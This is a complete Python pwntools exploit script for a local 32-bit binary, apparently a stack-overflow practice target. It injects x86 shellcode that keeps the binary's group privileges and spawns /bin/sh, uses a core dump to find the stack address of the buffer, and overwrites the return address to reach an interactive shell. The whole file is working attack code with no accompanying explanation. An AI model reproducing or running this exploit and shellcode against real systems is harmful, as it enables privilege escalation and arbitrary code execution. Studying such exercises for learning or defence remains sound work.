#! /usr/bin/env python

from pwn import *

shellcode = '\xb82\x00\x00\x00\xcd\x80\x89\xc3\x89\xc1\xb8G\x00\x00\x00\xcd\x801\xc91\xd2Qhn/shh//bi\x89\xe3\xb8\x0b\x00\x00\x00\xcd\x80'

p = process('./stack-ovfl-sc-32')

# [shellcode] [fill 0x88 + 4] [return addr]

buf = 'A' * 0x88 + 'A' * 4 + 'BBBB'

buf = shellcode
buf += 'A' * ((0x88 + 4) - len(shellcode))
buf += 'BBBB'

p.sendline(buf)
p.wait()

c = Core('./core')

buffer_addr = c.stack.find(buf)

print(hex(buffer_addr))

buf = shellcode
buf += 'A' * ((0x88 + 4) - len(shellcode))
buf += p32(buffer_addr)

p = process('./stack-ovfl-sc-32')
p.sendline(buf)
p.interactive()

